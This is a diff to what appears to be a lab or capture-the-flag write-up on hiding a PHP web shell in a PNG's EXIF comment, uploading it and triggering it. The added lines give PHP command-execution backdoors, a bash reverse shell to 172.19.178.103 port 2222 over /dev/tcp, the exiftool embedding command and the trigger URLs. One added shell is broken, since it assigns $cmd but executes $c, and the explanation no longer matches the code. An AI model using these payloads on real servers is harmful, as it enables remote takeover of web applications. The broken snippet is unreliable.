@@ -109,8 +109,16 @@ Table: users
 
 ## Final method
 
-**First we create a php file with a backdoor inside it:**
+**First we create a php file with a php backdoor inside it:**
 
+```
+<?php $cmd=$_GET['c']; system($c); ?>
+``` 
+or
+```
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/172.19.178.103/2222 0>&1'");?>.
+```
+or 
 ```
 <?php
 
@@ -122,30 +130,34 @@ if(isset($_REQUEST['cmd'])){
     die;
 }
 ?>
-``` 
+```
 
 Explanation of the code:
 
-1. First the code checks if there's a cmd parameter in the url;
-2. If so, it creates a pre tag on the page to generate retrieve the information withou breaking it, keeping the breaks and the spaces.
-3. Assigns the content of the parameter **cmd** to the variable **cmd**
-4. System() is for executing a system command on the server and immediately displaying the output.
-5. Kill the script
+1. First the code checks if there's a **c** parameter in the url;
+2. Assigns the content of the parameter **c** to the variable **c**
+3. System() is for executing a system command on the server.
+
 
 
 **Using exiftool we are going to add a comment with our payload o the image**
 
 ```
-exiftool "-comment<=file.php" backdoor.png
+exiftool "-comment<=file.php" tux.png
 ```
 
-We are now ready to upload our backdoor and generate a reverse shell.
+We are now ready to upload our __image__ and generate a reverse shell.
 
 
-## Now you can upload the file. After the upload you can trigger the backdoor using:
+## Now you can upload the file. After the upload you can trigger the backdoor usin this for the first two:
 
 ```
-(...).png/cmd.php?cmd=ls
+(...).png/c.php
+```
+### And this one for the third:
+
+```
+(...).png/c.php?c=ls
 ```
 
 __We need to add cmd.php, otherwise the photo is displayed instead of the code we want__
